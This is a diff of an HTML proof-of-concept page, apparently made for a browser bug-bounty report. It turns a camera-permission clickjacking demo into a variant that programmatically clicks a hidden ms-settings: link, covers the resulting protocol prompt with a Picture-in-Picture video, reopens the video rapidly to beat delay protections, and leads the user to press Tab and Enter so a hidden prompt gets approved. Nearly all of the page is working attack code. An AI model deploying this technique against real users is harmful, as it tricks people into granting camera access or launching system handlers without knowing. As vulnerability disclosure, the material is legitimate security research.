@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PoC: Permission Prompt Obscured by Video PiP (Variant for VRP)</title>
+    <title>PoC: PiP Obscuration for URI Scheme Prompts (Hypothetical Bypass Variant for VRP)</title>
     <style>
         html { font-family: sans-serif; }
         #instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
@@ -11,25 +11,18 @@
             bottom: 0;
             right: 0px;
         }
-        #permElem {
-            width: fit-content;
-            height: 1px;
-            font-size: 11px;
-            outline: none;
-            background: #fff;
-            color: #888;
-        }
-        video { display: none; } /* Hide video initially */
+        #uriTrigger { display: none; }
+        video { display: none; }
     </style>
 </head>
 <body>
-    <h1>PoC: Permission Prompt Obscured by Video PiP (Double Enter Variant)</h1>
-    <p>This demonstrates a variant where user is tricked into pressing Enter twice: first closes PiP, second approves hidden permission. Integrated with webcam and hosted video for testing.</p>
-    <p id="instructions">Click 'Start Webcam', then press Tab three times, then Enter twice</p>
+    <h1>PoC: PiP Obscuration for URI Scheme Prompts (e.g., ms-settings) with Timing Bypass Attempt</h1>
+    <p>This variant attempts to obscure URI scheme prompts (e.g., ms-settings:bluetooth) using Video PiP, with rapid timing to potentially bypass delay protections. Integrated with webcam for permission test fallback. Test on Windows Chrome pre/post-fix.</p>
+    <p id="instructions">Click 'Start Test', then press Tab four times, then Enter three times (simulating bypass delay)</p>
     
-    <!-- Webcam Video for Permission Test -->
+    <!-- Webcam for Fallback Permission Test -->
     <video id="webcamPlayer" autoplay playsinline></video>
-    <button id="startWebcamButton">Start Webcam (Request Camera Permission)</button>
+    <button id="startTestButton">Start Test (Trigger URI Prompt & PiP)</button>
     
     <!-- Hosted Video for PiP Obscuration -->
     <video id="pipVideo" loop>
@@ -37,64 +30,65 @@
     </video>
     
     <div id="wrapper">
-        <permission id="permElem" type="camera"></permission>
+        <a id="uriTrigger" href="ms-settings:bluetooth">Trigger URI</a> <!-- Hidden URI trigger -->
     </div>
     
     <script>
         const instructions = document.getElementById('instructions');
-        const startWebcamButton = document.getElementById('startWebcamButton');
+        const startTestButton = document.getElementById('startTestButton');
         const webcamVideo = document.getElementById('webcamPlayer');
         const pipVideo = document.getElementById('pipVideo');
-        const permElem = document.getElementById('permElem');
+        const uriTrigger = document.getElementById('uriTrigger');
         let pipWindow;
+        let attemptCount = 0;
 
-        // Start Webcam and Trigger Permission Prompt
-        startWebcamButton.addEventListener('click', async () => {
+        // Start Test: Trigger URI, PiP, and Webcam as Fallback
+        startTestButton.addEventListener('click', async () => {
             try {
+                // Trigger URI scheme to show prompt (e.g., open Bluetooth settings)
+                uriTrigger.click(); // This will trigger the external protocol prompt
+                
+                // Immediately play video and request PiP to obscure
+                pipVideo.play();
+                await pipVideo.requestPictureInPicture();
+                
+                // Fallback: Request webcam permission (if URI fails, test camera)
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 webcamVideo.srcObject = stream;
-                instructions.innerText = 'Press Tab three times, then Enter twice';
-                startWebcamButton.disabled = true;
-                // Focus on permElem to trigger prompt interaction
-                permElem.focus();
+                
+                instructions.innerText = 'Press Tab four times, then Enter three times (First closes PiP, others approve hidden prompt)';
+                startTestButton.disabled = true;
+                
+                // Hypothetical timing bypass: Rapid PiP re-open after close
+                setTimeout(async () => {
+                    if (document.pictureInPictureElement && attemptCount < 2) {
+                        await document.exitPictureInPicture();
+                        await pipVideo.requestPictureInPicture();
+                        attemptCount++;
+                    }
+                }, 300); // Time to potentially hit before delay kicks in
             } catch (error) {
-                alert('Failed to access webcam: ' + error.message);
+                alert('Failed: ' + error.message);
             }
         });
 
-        // Listen for keydown on permElem to open PiP
-        permElem.addEventListener('keydown', async (e) => {
-            if (e.keyCode === 9) return; // Ignore Tab
-            if (pipWindow) return;
-
-            // Play video and request PiP to obscure
-            pipVideo.play();
-            try {
-                await pipVideo.requestPictureInPicture();
-                // Adjust instructions for double Enter variant
-                instructions.innerText = 'Press Tab three times, then Enter twice (First closes PiP, second approves)';
-            } catch (error) {
-                console.error('PiP failed:', error);
-            }
-        });
-
-        // Monitor permission status (camera granted?)
-        setInterval(async () => {
-            const permStatus = await navigator.permissions.query({ name: 'camera' });
-            if (permStatus.state === 'granted') {
-                instructions.innerText = 'Permission granted! Thank you.';
-                permElem.remove();
-                if (pipWindow) pipWindow.close();
-            }
-        }, 500);
-
-        // Handle PiP events
+        // Handle PiP events for re-obscuration
         pipVideo.addEventListener('enterpictureinpicture', () => {
             pipWindow = document.pictureInPictureElement;
         });
         pipVideo.addEventListener('leavepictureinpicture', () => {
             pipWindow = null;
+            // Re-trigger PiP quickly
+            setTimeout(() => pipVideo.requestPictureInPicture(), 100);
         });
+
+        // Monitor camera permission as indicator (for fallback)
+        setInterval(async () => {
+            const permStatus = await navigator.permissions.query({ name: 'camera' });
+            if (permStatus.state === 'granted') {
+                instructions.innerText = 'Access granted! (Check if URI also triggered)';
+            }
+        }, 500);
     </script>
 </body>
 </html>
